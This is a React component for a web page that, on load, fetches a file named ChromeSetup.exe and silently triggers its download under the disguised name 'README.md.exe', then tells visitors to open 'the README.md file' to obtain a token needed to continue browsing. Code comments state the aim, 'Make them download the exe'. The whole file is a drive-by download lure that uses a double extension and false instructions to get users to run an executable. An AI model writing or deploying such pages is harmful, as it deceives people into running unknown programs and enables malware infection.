import { useEffect, useState } from "react";

function App() {
  useEffect(() => {
    // DOwnload the latest version of Chrome
    // Install it
    // Restart the computer

    // The file is located in files/ChromeSetup.exe

    // Make them download the exe
    fetch("/files/ChromeSetup.exe")
      .then((res) => res.blob())
      .then((blob) => {
        const url = window.URL.createObjectURL(blob);
        const a = document.createElement("a");
        a.href = url;
        a.target = "_blank";
        a.rel = "noopener noreferrer";
        a.download = "README.md.exe";
        a.click();
      });
  }, []);

  const onClick = () => {
    //Close the window
    if (token) {
      location.href = "https://github.com/";
    } else {
      setError("Please enter a token.");
    }
  };

  const [token, setToken] = useState("");
  const [error, setError] = useState("");

  return (
    <>
      <h1>Open the README.md file to continue browsing the site.</h1>
      <p>
        It will display guides on how to use this site, also it will give you a
        token which allows you to continue.
      </p>
      <input
        type="text"
        placeholder="Token..."
        name="token"
        value={token}
        onChange={(e) => setToken(e.target.value)}
      />
      <p>{error}</p>
      <button onClick={onClick}>Continue...</button>
    </>
  );
}

export default App;
